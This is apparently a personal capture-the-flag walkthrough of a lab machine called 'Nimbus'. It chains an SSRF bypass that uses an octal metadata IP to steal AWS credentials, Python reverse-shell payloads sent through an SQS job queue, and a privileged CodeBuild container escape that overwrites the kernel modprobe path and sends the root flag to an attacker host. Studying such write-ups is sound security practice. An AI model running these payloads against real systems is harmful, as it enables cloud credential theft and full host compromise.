\------------------------------------------------------------------------------------Nimbus----------------------------------------------------------------------------------





Step:-1 Reconnaissance





nmap -A -sS -P -T4  --min-rate 5000 10.129.38.59

Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-06-25 14:30 UTC

Nmap scan report for 10.129.38.59

Host is up (0.26s latency).

Not shown: 998 closed tcp ports (reset)

PORT   STATE SERVICE VERSION

22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)

| ssh-hostkey:

|   256 eb:ab:8f:be:99:02:0b:3e:c4:1c:83:b2:66:2f:17:13 (ECDSA)

|\_  256 c1:69:ab:84:f3:88:8b:b3:8a:ae:e2:28:35:54:35:0b (ED25519)

80/tcp open  http    nginx 1.24.0 (Ubuntu)

|\_http-title: Did not follow redirect to http://nimbus.htb/

|\_http-server-header: nginx/1.24.0 (Ubuntu)

No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).

TCP/IP fingerprint:

OS:SCAN(V=7.94SVN%E=4%D=6/25%OT=22%CT=1%CU=30320%PV=Y%DS=2%DC=T%G=Y%TM=6A3D

OS:3BA7%P=x86\_64-pc-linux-gnu)SEQ(SP=F8%GCD=1%ISR=107%TI=Z%CI=Z%II=I%TS=A)S

OS:EQ(SP=F9%GCD=1%ISR=107%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=FD%GCD=1%ISR=106%TI=Z%

OS:CI=Z%TS=A)SEQ(SP=FD%GCD=1%ISR=107%TI=Z%CI=Z%TS=A)SEQ(SP=FE%GCD=1%ISR=108

OS:%TI=Z%CI=Z%TS=A)OPS(O1=M552ST11NW7%O2=M552ST11NW7%O3=M552NNT11NW7%O4=M55

OS:2ST11NW7%O5=M552ST11NW7%O6=M552ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%

OS:W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M552NNSNW7%CC=Y%Q=)T1(R=Y%DF=

OS:Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%

OS:F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y

OS:%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%R

OS:D=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)I

OS:E(R=Y%DFI=N%T=40%CD=S)



Network Distance: 2 hops

Service Info: OS: Linux; CPE: cpe:/o:linux:linux\_kernel



TRACEROUTE (using port 5900/tcp)

HOP RTT       ADDRESS

1   287.25 ms 10.10.14.1

2   288.00 ms 10.129.38.59



OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

Nmap done: 1 IP address (1 host up) scanned in 41.85 seconds





\[#] A Linux Hard machine! interesting!





\[#] While surfing the web, it appears to be a Job scheduling website. which schedules the user uploaded job at server



\[#] However this could only be the attack vector towards gaining the initial foothold, as it is letting us run job at their server via uploading a file





\[#] While looking more into the web i have found a "Healthcheck" link down there of the main container. and it gave a me json data



&#x09;

services

queue

endpoint	"http://aws.nimbus.htb"

status	"ok"

scheduler

endpoint	"http://aws.nimbus.htb"

status	"ok"

storage

endpoint	"http://aws.nimbus.htb"

status	"ok"

status	"healthy"

version	"1.4.2"





\[#] The data is of some service status, who's endpoint is **"http://aws.nimbus.htb"**. and hence we got a subdomain as well.





\[#] After reaching the endpoint it shows!



<ErrorResponse>

<Error>

<Type>Sender</Type>

<Code>InvalidClientTokenId</Code>

<Message>

**The security token included in the request is invalid.**

</Message>

</Error>

<RequestId>p7518495-adc4-1191-49n2-4m70d8sdf922</RequestId>

</ErrorResponse>







\[#] Some Request is being made and in response we are getting an error mentioning invalid token inclusion!





\[#] It turns out to be a GET request



GET / HTTP/1.1

Host: aws.nimbus.htb

User-Agent: Mozilla/5.0 (X11; Linux x86\_64; rv:128.0) Gecko/20100101 Firefox/128.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,\*/\*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate, br

Connection: close

Upgrade-Insecure-Requests: 1

Priority: u=0, i





\[#] and response!



HTTP/1.1 403 FORBIDDEN

Server: nginx/1.24.0 (Ubuntu)

Date: Thu, 02 Jul 2026 13:09:29 GMT

Content-Type: text/xml; charset=utf-8

Content-Length: 305

Connection: close



<ErrorResponse xmlns="https://sts.amazonaws.com/doc/2011-06-15/">

&#x20; <Error>

&#x20;   <Type>Sender</Type>

&#x20;   <Code>InvalidClientTokenId</Code>

&#x20;   <Message>The security token included in the request is invalid.</Message>

&#x20; </Error>

&#x20; <RequestId>p7518495-adc4-1191-49n2-4m70d8sdf922</RequestId>

</ErrorResponse>







\[#] never mind, lets look explore the job creation endpoint, which asks for a YAML file in 2 ways (i) By a valid GitHub repo URL (ii) By uploading the YAML itself





\[#] Submitting a job reveals that code execution via PyYAML deserialization is blocked (safe\_load is used). However, the app tells us that jobs are queued in an AWS environment (region us-east-1) inside an SQS queue named nimbus-jobs, which a backend component (nimbus/worker) processes every 5 minutes (\*/5 \* \* \* \*).





\[#] the AWS metadata IP (169.254.169.254) is the endpoint where nimbus's aws access keys might be stored at, but the catch is that the internal network filter blocks out the request with an error message **"Error: Security policy: this URL targets an internal resource and has been blocked."** and also the URL must satisfy the yaml presence as well.





\[#] the default metadata credential address for AWS is --> /latest/meta-data/iam/security-credentials



\[#] if we can convert the ip address into OCTAL numbers, then maybe we can bypass the filter!





http://0251.0376.0251.0376/latest/meta-data/iam/security-credentials/?a=test.yaml





\[#]Returns the identity of nimbus as **"nimbus-web-role"**



\[#] now we can get the keys with -->  **http://0251.0376.0251.0376/latest/meta-data/iam/security-credentials/nimbus-web-role?a=test.yaml**





{

&#x20; "Code": "Success",

&#x20; "LastUpdated": "2026-07-02T13:39:54Z",

&#x20; "Type": "AWS-HMAC",

&#x20; **"AccessKeyId": "ASIAQX4PG7L2K9M3N5R8",**

&#x20; **"SecretAccessKey": "bXJ7K8mP/q2Hf+vN9wT4LcRe5Y1Aoz3DhU6gKjQs",**

&#x20; "Token": **"IQoJb3JpZ2luX2VjEHQaCXVzLWVhc3QtMSJGMEQCIBhV9zPmK3wQjL4nT8vR2xY7AoFqUk5HsP6BeMcW1aDgAiAR4tNoXzKp8VnJqL7mC3xY9FhWdQ5GBPmRkX2vT8jY6yqsAQiK//////////8BEAEaDDAwMDAwMDAwMDAwMCIMNZ5tQ7vEX2pKlHfqKtoBQwK5HmBcN4gXjVrUe1Pk9YsZ7DqWfThN3bMRoLYyJsKn8GpVxAcQ5VeWk2HiqXbF6CnXmM4PdYpL3rJzKqGtNvBfHcWyXa8jPzTn5LRMkV1QbWdAyKpGfHzNvU8TmEcL2qPdRhJsKgGn3VyXmFbBcNJ7QrHe5VpDxKfM",**

&#x20; "Expiration": "2026-07-02T19:39:54Z"

}



\[#] Perfect! we got the AWS-HMAC Access key and token.





\[#] Lets now validate the identity!





\[#] First export the keys!





export AWS\_ACCESS\_KEY\_ID="ASIAQX4PG7L2K9M3N5R8"

export AWS\_SECRET\_ACCESS\_KEY="bXJ7K8mP/q2Hf+vN9wT4LcRe5Y1Aoz3DhU6gKjQs"

export AWS\_SESSION\_TOKEN="IQoJb3JpZ2luX2VjEHQaCXVzLWVhc3QtMSJGMEQCIBhV9zPmK3wQjL4nT8vR2xY7AoFqUk5HsP6BeMcW1aDgAiAR4tNoXzKp8VnJqL7mC3xY9FhWdQ5GBPmRkX2vT8jY6yqsAQiK//////////8BEAEaDDAwMDAwMDAwMDAwMCIMNZ5tQ7vEX2pKlHfqKtoBQwK5HmBcN4gXjVrUe1Pk9YsZ7DqWfThN3bMRoLYyJsKn8GpVxAcQ5VeWk2HiqXbF6CnXmM4PdYpL3rJzKqGtNvBfHcWyXa8jPzTn5LRMkV1QbWdAyKpGfHzNvU8TmEcL2qPdRhJsKgGn3VyXmFbBcNJ7QrHe5VpDxKfM"

export AWS\_DEFAULT\_REGION="us-east-1"





\[#] Then validate via aws-cli



aws sts get-caller-identity --endpoint-url http://aws.nimbus.htb --output json



{

&#x20;   "UserId": "AROAQX4PG7L2K9M3N5R8H:i-0a1b2c3d4e5f6789a",

&#x20;   "Account": "847219365028",

&#x20;   "Arn": **"arn:aws:sts::847219365028:assumed-role/nimbus-web-role/i-0a1b2c3d4e5f6789a"**

}



&#x20;

\[#] The ARN (Amazon Resource name) Confirms the identity of nimbus-web-role with the provided keys, means the keys are real!







\[#] Lets list the queue





aws sqs list-queues --endpoint-url http://aws.nimbus.htb --output json



{

&#x20;   "QueueUrls": \[

&#x20;       **"http://floci:4566/847219365028/nimbus-jobs"**

&#x20;   ]

}







\[#] After some hints and findings i have understood that the backend parses the raw YAML files or code into proper JSON formats, and the worked shell expects a 'shell' parameter in the YAML, which basically works as the exec() function for python and then the worker picks up parsed YAML as json jobs and executes them!





\--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------





Step-2:- Initial Foothold





\[#] Lets create the parameter variables





\# 1. Define the parameters

Q="http://aws.nimbus.htb/847219365028/nimbus-jobs"

PAYLOAD="import socket,subprocess,os;s=socket.socket();s.connect(('10.10.14.\*\*\*\*',9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(\['/bin/bash','-i'])"



\# 2. Build the exact JSON body structure the worker expects

export EXP\_PAYLOAD="$PAYLOAD"

MSG\_BODY=$(python3 -c "import json, os; print(json.dumps({'name':'r1', 'runtime':'python3.11', 'script': os.environ\['EXP\_PAYLOAD']}))")







\[#] Ship it directly into the AWS Queue



aws sqs send-message --endpoint-url http://aws.nimbus.htb/ --queue-url $Q --message-body "$MSG\_BODY" --output json

&#x20;





s.nimbus.htb/ --queue-url $Q --message-body "$MSG\_BODY" --output json

{

&#x20;   "MD5OfMessageBody": "502ab8b83f3c72de992fe1c8cd31e83e",

&#x20;   "MessageId": "47b0e47c-9f9d-435a-b39d-1e41d82365fe"

}





\[#] ON listener!



nc -lvnp 9001

listening on \[any] 9001 ...

connect to \[10.10.14.70] from (UNKNOWN) \[10.129.38.159] 55950

bash: cannot set terminal process group (1): Inappropriate ioctl for device

bash: no job control in this shell

worker@f2ee5831b356:/app$ whoami

whoami

worker





\[#] Fortunately this container has user flag!



\--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------





Step-3: Privilege Escalation





\[#] We are in a app directory which has a worker.py file



worker@f2ee5831b356:/app$ cat worker.py



"""Nimbus job worker. Polls SQS, parses messages with yaml.load (vulnerable)."""

import os, time, subprocess, boto3, yaml



ENDPOINT  = os.environ.get("AWS\_ENDPOINT\_URL", "http://aws.nimbus.htb")

QUEUE\_URL = os.environ.get("QUEUE\_URL", "http://aws.nimbus.htb/000000000000/nimbus-jobs")

REGION    = os.environ.get("AWS\_DEFAULT\_REGION", "us-east-1")

POLL\_SECS = 5



print(f"\[worker] starting; endpoint={ENDPOINT} queue={QUEUE\_URL}", flush=True)

sqs = boto3.client("sqs", endpoint\_url=ENDPOINT, region\_name=REGION)



def handle\_message(body):

&#x20;   print(f"\[worker] received message ({len(body)} bytes)", flush=True)

&#x20;   job = yaml.load(body, Loader=yaml.Loader)  # vulnerable

&#x20;   if not isinstance(job, dict):

&#x20;       print("\[worker] message did not parse to a dict, skipping", flush=True)

&#x20;       return

&#x20;   name = job.get("name", "<unnamed>")

&#x20;   script = job.get("script", "")

&#x20;   print(f"\[worker] running job '{name}'", flush=True)

&#x20;   if script:

&#x20;       result = subprocess.run(\["python3", "-c", script],

&#x20;           capture\_output=True, text=True, timeout=30)

&#x20;       print(f"\[worker] stdout: {result.stdout}", flush=True)

&#x20;       if result.stderr: print(f"\[worker] stderr: {result.stderr}", flush=True)



def main():

&#x20;   while True:

&#x20;       try:

&#x20;           resp = sqs.receive\_message(QueueUrl=QUEUE\_URL,

&#x20;               MaxNumberOfMessages=1, WaitTimeSeconds=POLL\_SECS)

&#x20;           for m in resp.get("Messages", \[]):

&#x20;               try: handle\_message(m\["Body"])

&#x20;               except Exception as e: print(f"\[worker] error: {e}", flush=True)

&#x20;               finally:

&#x20;                   sqs.delete\_message(QueueUrl=QUEUE\_URL, ReceiptHandle=m\["ReceiptHandle"])

&#x20;       except Exception as e:

&#x20;           print(f"\[worker] poll error: {e}", flush=True)

&#x20;           time.sleep(POLL\_SECS)



if \_\_name\_\_ == "\_\_main\_\_":

&#x20;   main()







\[#] The application completely ignores everything else during execution. It extracts the raw string under the "script" key and feeds it explicitly to python3 -c.



\[#] The developer specifically used yaml.Loader instead of yaml.SafeLoader. Even though the frontend web page safely parses with safe\_load, this background worker process reads whatever raw string is waiting inside SQS and runs it through PyYAML's unrestricted object constructor.



\[#] Finally The worker retrieves a message, attempts to process it, and immediately removes it from the queue using its ReceiptHandle regardless of whether the execution crashed or succeeded.







\[#] Now for the privsec, the first thing i look at was the environment variables!



worker@4a4d875e352d:/app$ env

env

PYTHON\_SHA256=272179ddd9a2e41a0fc8e42e33dfbdca0b3711aa5abf372d3f2d51543d09b625

HOSTNAME=4a4d875e352d

PYTHON\_VERSION=3.11.15

AWS\_DEFAULT\_REGION=us-east-1

PWD=/app

HOME=/home/worker

LANG=C.UTF-8

LS\_COLORS=

GPG\_KEY=A035C8C19219BA821ECEA86B64E628F8D684696D

AWS\_SECRET\_ACCESS\_KEY=dM4nV/q8Hf7LcRpZ2eY1KjBxN5Aozs3T6gU9JfWh

QUEUE\_URL=http://aws.nimbus.htb/847219365028/nimbus-jobs

SHLVL=1

AWS\_ACCESS\_KEY\_ID=AKIA7P3R9X4K8M2L5VHN

AWS\_ENDPOINT\_URL=http://aws.nimbus.htb

PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

\_=/usr/bin/env





\[#] Of course the keys are different from the previous ones!

\[#] Now as we know this is a complete aws cloud environment, we can look for the files stored in cloud buckets! aka S3 buckets



\[!] What are S3 buckets? -In cloud architecture, S3 Buckets (Simple Storage Service) are public or private storage containers used by developers to store files, application backups, source code, and deployment configurations.





\[#] Means developers could have stored some sort of files their, maybe some config files or some executables!, we better find that out!



worker@4a4d875e352d:/app$ aws --endpoint-url http://floci:4566/ --region us-east-1 s3 ls s3://nimbus-dev-artifacts/ --recursive



<east-1 s3 ls s3://nimbus-dev-artifacts/ --recursive

2026-07-09 15:19:19       1755 source/worker.py



\[#] So after listing the files, it turns out to be the same worker.py file.



\[#] I have also tried replacing the file with a reverse shell payload file, but unfortunately there was no source for triggering the execution of this file!







\[#] Then i have figured out about codebuild thing, and this is where things get real messy!



\[!] AWS CodeBuild is a fully managed continuous integration (CI) service in the cloud. In simple words, it is a tool developers use to automate the process of compiling source code, running software tests, and producing ready-to-deploy software packages (artifacts).



\[#] How CodeBuild Works Under the Hood





\[!] When a developer triggers a build,



AWS CodeBuild performs three core steps:

\[Trigger Build] ➔ \[Spins up temporary Docker Container] ➔ \[Executes Buildspec Commands]



* The Container: CodeBuild spins up a temporary, isolated Docker container using an operating system image specified by the developer (e.g., Ubuntu with Python or Java pre-installed).



* The Buildspec: Inside this temporary container, CodeBuild looks for a file named buildspec.yml. This file is a simple recipe card written in YAML format that lists the exact operating system commands CodeBuild must execute (e.g., npm install, python3 test.py).



* The Cleanup: Once the commands finish running, CodeBuild saves the output packages to an S3 bucket and automatically destroys the temporary container.





\[#] As the Codebuild executes commands from a buildspec file, however we can create a crafted buildspec file and then maybe we could do the remote code execution on the server



\[#] We need to register the project to and then the codebuild will execute its buildspec file



\[#] Lets try creating a file and register the project



\[#] After Researching a little bit, i have understood on how to create a project!





\[project.json] ➔ Defines the Infrastructure Blueprint This file uses JSON (JavaScript Object Notation) to talk to the local AWS emulator API. It is a configuration blueprint that tells AWS CodeBuild how to configure the environment before running any code.

&#x20;      ↓

\[buildspec.yml] ➔ Lists the Build Phase Commands

&#x20;      ↓

\[getroot.sh] ➔ The Payload Script Executed by the Build



\[#] we need to specify 3 files, project.json will specify the infrastructure blueprint, while yaml is where will put the path for the payload!





\[#] YAML (YAML Ain't Markup Language) is a human-readable text format used heavily in cloud architecture for configuration files. In AWS CodeBuild, the buildspec.yml file acts as the step-by-step recipe card for the container.







\[#] We can try creating these files and register the project, and will start the codebuild, and as soon as the AWS Docker container spins up, and executes the build phases from buildspec.yaml, we will likely to be able to get code execution as root!



&#x20;

\[#] Lets execute the plan, by first creating the a reverse shell payload! 





cat > /tmp/root.sh << 'EOF'

\#!/bin/bash

python3 -c "

import socket,subprocess,os

s=socket.socket(socket.AF\_INET,socket.SOCK\_STREAM)

s.connect(('10.10.14.\*\*\*\*', 9006))

os.dup2(s.fileno(),0)

os.dup2(s.fileno(),1)

os.dup2(s.fileno(),2)

subprocess.call(\['/bin/bash','-i'])

"

EOF



chmod +x /tmp/root.sh





\[#] The payload will grant us a reverse shell!





\[#] Now we need to create the buildspec recipe. and will put the path of this reverse shell payload inside the buildspec



Create buildspec

cat > /tmp/buildspec.yml << 'EOF'

version: 0.2

phases:

&#x20; build:

&#x20;   commands:

&#x20;     

/tmp/root.sh

EOF







\[#] Now we need to create the supported Infrastructure Blueprint for new project submission





python3 -c '

import json

project = {

&#x20; "name": "root-exploit",

&#x20; "source": {"type": "NO\_SOURCE", "buildspec": open("/tmp/buildspec.yml").read()},

&#x20; "artifacts": {"type": "NO\_ARTIFACTS"},

&#x20; "environment": {

&#x20;   "type": "LINUX\_CONTAINER",

&#x20;   "image": "floci/floci:latest",

&#x20;   "computeType": "BUILD\_GENERAL1\_SMALL",

&#x20;   "privilegedMode": True,

&#x20;   "environmentVariables": \[

&#x20;     {"name": "BASH\_FUNC\_id%%",

&#x20;      "value": "() { echo "uid=0(root) gid=0(root) groups=0(root)"; }",

&#x20;      "type": "PLAINTEXT"}

&#x20;   ]

&#x20; },

&#x20; "serviceRole": "arn:aws:iam::000000000000:role/codebuild-role"

}

print(json.dumps(project))

' > /tmp/project.json







* "name": "root-exploit"Registers a distinct, unique tracking name for the project template inside the local Floci/LocalStack service registry.





* "source": {"type": "NO\_SOURCE", "buildspec": open("/tmp/buildspec.yml").read()} :Instead of hardcoding the build commands as a confusing multi-line string inside the JSON, this line automatically opens your pre-existing /tmp/buildspec.yml file, reads its text, and inserts it cleanly into the JSON object



* "artifacts": {"type": "NO\_ARTIFACTS"}Instructs CodeBuild that this task is an execution script only and will not produce any software build files (like zip files or binaries) that need to be saved back to an S3 bucket.



"environment": { ... }This section configures the underlying hardware and container specifications



&#x20;  \~"type": "LINUX\_CONTAINER": Tells the system to run the build task inside a standard Linux container workspace.





&#x20;  \~"image": "floci/floci:latest": Spawns the task using the local, cached image provided by the emulation framework instead of trying to reach out to the real AWS public container 	registry(which would cause a connection timeout)





&#x20; \~"computeType": "BUILD\_GENERAL1\_SMALL": Specifies the CPU and memory tier allocated to the building container task.



&#x20; **\~"privilegedMode": True: The core vulnerability setting. This explicitly tells the Docker daemon to drop all security isolation walls. It provides your container process with full  	kernel capabilities (CAP\_SYS\_ADMIN).**







* "name": "BASH\_FUNC\_id%%" / "value": "() { ... }": This introduces a functional mock environment. It exports a custom bash function that forces the system command id to fake its output and print uid=0(root) gid=0(root) groups=0(root). This is highly useful for spoofing internal automation scripts that check for root conditions before running advanced features





* "serviceRole": "arn:aws:iam::000000000000:role/codebuild-role"Assigns a standard Amazon Resource Name (ARN) service role to the build task, which satisfies the local API syntax validation requirements.





\[#] we will eventually get the root flag, on the listener after triggering the build!





\[#] Now with everything defined, we can create the project





worker@f6904442f501:/app$ aws --endpoint-url http://floci:4566/ --region us-east-1 codebuild create-project --cli-input-json file://project.json



<create-project --cli-input-json file://project.json

{

&#x20;   "project": {

&#x20;       "name": "root-exploit",

&#x20;       "arn": "arn:aws:codebuild:us-east-1:847219365028:project/root-exploit",

&#x20;       "source": {

&#x20;           "type": "NO\_SOURCE",

&#x20;           "buildspec": "version: 0.2\\nphases:\\n  build:\\n    commands:\\n      - echo '=== HOLDING EXECUTION FOR PAUSE ==='\\n      - echo 'Press Enter inside the paused prompt to extract the flag...'\\n      - read -p 'PAUSE\_TRIGGER' dummy\_var\\n      - whoami\\n      - cat /root/root.txt"

&#x20;       },

&#x20;       "artifacts": {

&#x20;           "type": "NO\_ARTIFACTS"

&#x20;       },

&#x20;       "environment": {

&#x20;           "type": "LINUX\_CONTAINER",

&#x20;           "image": "aws/codebuild/standard:5.0",

&#x20;           "computeType": "BUILD\_GENERAL1\_SMALL",

&#x20;           "privilegedMode": true

&#x20;       },

&#x20;       "serviceRole": "arn:aws:iam::000000000000:role/service-role",

&#x20;       "timeoutInMinutes": 60,

&#x20;       "queuedTimeoutInMinutes": 480,

&#x20;       "created": "2026-07-09T14:40:19.889000+00:00",

&#x20;       "lastModified": "2026-07-09T14:40:19.889000+00:00",

&#x20;       "projectVisibility": "PRIVATE"

&#x20;   }

}







\[#] The project submitted successfully, now lets trigger the build!





worker@f6904442f501:/app$ aws --endpoint-url http://floci:4566/ --region us-east-1 codebuild start-build --project-name root-exploit

<odebuild start-build --project-name root-exploit-v2

{

&#x20;   "build": {

&#x20;       "id": "root-exploit:1",

&#x20;       "arn": "arn:aws:codebuild:us-east-1:847219365028:build/root-exploit-v2:1",

&#x20;       "buildNumber": 1,

&#x20;       "startTime": "2026-07-09T14:40:47.669000+00:00",

&#x20;       "currentPhase": "SUBMITTED",

&#x20;       "buildStatus": "IN\_PROGRESS",

&#x20;       "projectName": "root-exploit",

&#x20;       "phases": \[],

&#x20;       "source": {

&#x20;           "type": "NO\_SOURCE",

&#x20;           "buildspec": "version: 0.2\\nphases:\\n  build:\\n    commands:\\n      - echo '=== HOLDING EXECUTION FOR PAUSE ==='\\n      - echo 'Press Enter inside the paused prompt to extract the flag...'\\n      - read -p 'PAUSE\_TRIGGER' dummy\_var\\n      - whoami\\n      - cat /root/root.txt"

&#x20;       },

&#x20;       "artifacts": {},

&#x20;       "environment": {

&#x20;           "type": "LINUX\_CONTAINER",

&#x20;           "image": "aws/codebuild/standard:5.0",

&#x20;           "computeType": "BUILD\_GENERAL1\_SMALL",

&#x20;           "privilegedMode": true

&#x20;       },

&#x20;       "timeoutInMinutes": 60,

&#x20;       "queuedTimeoutInMinutes": 480,

&#x20;       "buildComplete": false,

&#x20;       "initiator": "user"

&#x20;   }

}





\[#] The build was succeeded!





\[#] But unfortunately there was no activity on the shell!



nc -lvnp 9006

listening on \[any] 9006 ...







\[#] Lets look for the status logs for the project build!



worker@f6904442f501:/app$ aws --endpoint-url http://floci:4566/ --region us-east-1 codebuild batch-get-builds --ids "root-exploit-v2:1"

{

&#x20;   "builds": \[

&#x20;       {

&#x20;           "id": "root-exploit-v2:1",

&#x20;           "currentPhase": "COMPLETED",

&#x20;           **"buildStatus": "FAULT",**

&#x20;           "projectName": "root-exploit-v2",

&#x20;           "phases": \[

&#x20;               { "phaseType": "SUBMITTED", "phaseStatus": "SUCCEEDED" },

&#x20;               { "phaseType": "QUEUED", "phaseStatus": "SUCCEEDED" },

&#x20;               { "phaseType": "PROVISIONING", "phaseStatus": "SUCCEEDED" },

&#x20;               { "phaseType": "DOWNLOAD\_SOURCE", "phaseStatus": "SUCCEEDED" }

&#x20;           ],

&#x20;           ...





\[#] For some reason the build failed!



\[!] In AWS CodeBuild, the buildStatus: FAULT status typically indicates an internal service error or a failure that occurs before the build commands themselves can even begin executing.this happened because the execution engine crashed during the transition between the infrastructure setup and the actual command phases.





\[#] So the fault never really let the buildspec to be executed on the server, it crashed in between.





\[#] There could also be 3 possible reasons



* Interactive Command Failure: root-exploit project included an interactive read -p command. CodeBuild runs as a non-interactive background process with no TTY (terminal) attached. When the container encountered a command requiring manual keyboard input, it couldn't proceed and faulted the entire build process.



* Initialization Crash (Provisioning Fault): logs showed the build reaching DOWNLOAD\_SOURCE successfully but failing immediately after. This is a common fault in LocalStack environments when the emulator cannot find or pull the specified container image (like aws/codebuild/standard:5.0) from the local Docker daemon.



* Asynchronous Service Deadlocks: Because we were running the start-build command without a wait or log-follow parameter, the build process was detached. If the background worker encountered a network bridge lock or a database state conflict, it simply reported a FAULT status to the API and terminated.





&#x20;



\[#] After a lot of enumeration and IRC assistance, i got to know that the /proc/sys/kernel/modprobe is writeable!







The /proc filesystem is a virtual interface to internal kernel data structures.



* &#x20;  Purpose: The specific file /proc/sys/kernel/modprobe contains the path to the modprobe program (typically /sbin/modprobe).





* &#x20;  Mechanism: When the kernel needs to load a module (for example, when a process tries to execute a file with an unknown signature), it looks at the path stored in this file to   	determine which program to run to handle the request.







\[#] however, we can change the path stored in this file which is the default /sbin/modprobe, and replace it with our crafted script's path!





\[#] So the attack path could be 



&#x09;Creating the crafted payload!

&#x09;	   |

&#x09;overwriting  the modeprob path

&#x20;   		   |

Then will trigger it with an unknown file signature, that Linux doesn't recognize 

&#x09;	   |

as the unknown file is reported, the kernel will call the program listed in the modprobe\_path (basically our script!)





\[#] Because the path has been overwritten, the host kernel executes the attacker's script with full root privileges on the host.





\[@] So can we just simply overwrite the modeprob\_path and trigger an unsigned fatal binary ? - Technically No!, Because the standard container does not have sufficient privileges to write the kernel obviously!



\[@] So how are we gonna write the kernel? - By using the **Privileged Mode Permission,** The AWS project creation from previous attempts already explained the significance of **privilegedMode: true** parameter, with this we can bypass this security check for privileges, and can directly execute anything as root! in simple words!





\[#] So when earlier i wrote about the /proc/modprobe being writeable, that was for host, of course, but that was the only attack vector that could lead us towards the container escape





\[#] But here's a catch, we also need to find out the exact disk location for the payload storage. i mean the host file system would never gonna recognize the payload file inside /tmp/payload.sh. because that is a containerized folder. and the physical location of disk on host filesystem would be different!





\[#] After a searching a bit, mount path is know as upperdir, which is mounted at /proc/mounts on the host 



\[#] Vulnerabilities occur when sensitive host paths (like /, /proc, or /sys) are mounted into a container, especially with write access, as this can collapse the isolation and expose host resources.





\[#] Now all of this makes sense, as a multi-chained attack, we can create a python script for better automation and reusability!





\[#] Lets execute now!



import boto3



ENDPOINT = "http://floci:4566"

REGION = "us-east-1"

ATTACKER\_IP = "10.10.14.\*\*\*\*"   # <-- your tun0 IP

LPORT = 9005



buildspec = f"""version: 0.2

phases:

&#x20; build:

&#x20;   commands:

&#x20;     - id

&#x20;     - cat /proc/self/status | grep Cap

&#x20;     - |

&#x20;       cat > /tmp/payload.sh << 'PYEOF'

&#x20;       #!/bin/sh

&#x20;       python3 -c "

&#x20;       import socket

&#x20;       s = socket.socket()

&#x20;       s.connect(('{ATTACKER\_IP}', {LPORT}))

&#x20;       s.send(open('/root/root.txt','rb').read())

&#x20;       s.close()

&#x20;       "

&#x20;       PYEOF

&#x20;     - chmod +x /tmp/payload.sh

&#x20;     - |

&#x20;       upper=$(awk '/overlay/{{match($0,/upperdir=(\[^,]+)/,a);if(a\[1])print a\[1]}}' /proc/mounts | head -1)

&#x20;       echo "$upper/tmp/payload.sh" > /proc/sys/kernel/modprobe

&#x20;     - printf '\\\\xff\\\\xff\\\\xff\\\\xff' > /tmp/x \&\& chmod +x /tmp/x \&\& /tmp/x; true

"""



cb = boto3.client("codebuild", endpoint\_url=ENDPOINT, region\_name=REGION)



cb.create\_project(

&#x20;   name="nimbus-exploit",

&#x20;   source={"type": "NO\_SOURCE", "buildspec": buildspec},

&#x20;   artifacts={"type": "NO\_ARTIFACTS"},

&#x20;   environment={

&#x20;       "type": "LINUX\_CONTAINER",

&#x20;       "image": "floci/floci:latest",

&#x20;       "computeType": "BUILD\_GENERAL1\_SMALL",

&#x20;       "privilegedMode": True,

&#x20;       "environmentVariables": \[

&#x20;           {"name": "BASH\_FUNC\_id%%",

&#x20;            "value": '() { echo "uid=0(root) gid=0(root) groups=0(root)"; }',

&#x20;            "type": "PLAINTEXT"}

&#x20;       ],

&#x20;   },

&#x20;   serviceRole="arn:aws:iam::000000000000:role/codebuild-role",

)



resp = cb.start\_build(projectName="nimbus-exploit")

print("started:", resp\["build"]\["id"])







\[#] We started script by creating a reverse shell payload that will read root flag, we then gave it executable permissions!



\[#] Then Translated the container path to the host's physical path





\[#] Then Overwrote the kernels modeprob\_path with our script's host side path!





\[#] Then triggered the kernel by executing a file with an unknown signature 





\[#] Then registered the project with privilegedMode enabled





\[#] And Finally started the build and triggered the escape!







\[#] And on the listener!



listening on \[any] 9005 ...

connect to from (UNKNOWN) 42452

98f499aa9ab704d5b981f1b4\*\*\*\*\*\*







\[#] Finally Container escaped !!!!!!!







